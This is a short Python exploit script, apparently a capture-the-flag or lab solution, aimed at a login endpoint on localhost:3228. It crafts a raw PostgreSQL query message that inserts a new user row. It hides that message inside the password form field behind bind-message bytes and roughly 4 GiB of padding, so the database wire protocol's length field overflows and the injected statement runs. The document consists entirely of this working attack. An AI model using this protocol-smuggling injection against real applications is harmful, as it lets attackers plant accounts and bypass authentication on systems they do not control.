import requests
import urllib.parse

query = b'INSERT INTO users(login, password) VALUES($$nik$$, $$nik$$)'
query += b'\x00'
length = (len(query) + 4).to_bytes(4, 'big')
query_message = b'Q' + length + query

"""
parts that follows the password value in the bind message
0x00 0x01 : number of column format specifications
0x00 0x01 : COUNT(*) is received in binary format
"""
adjust_payload = b'\x00\x01\x00\x01'

payload = f'login=hoge&password={adjust_payload.decode() + query_message.decode() + 'A' * ((1<<32) - len(adjust_payload) - len(query_message))}'
print(f'Sending payload... (payload length: {len(payload)} B)')

res = requests.post(
    'http://localhost:3228/login',
    headers={'Content-Type': 'application/x-www-form-urlencoded'},
    data=payload,
)

print('Done')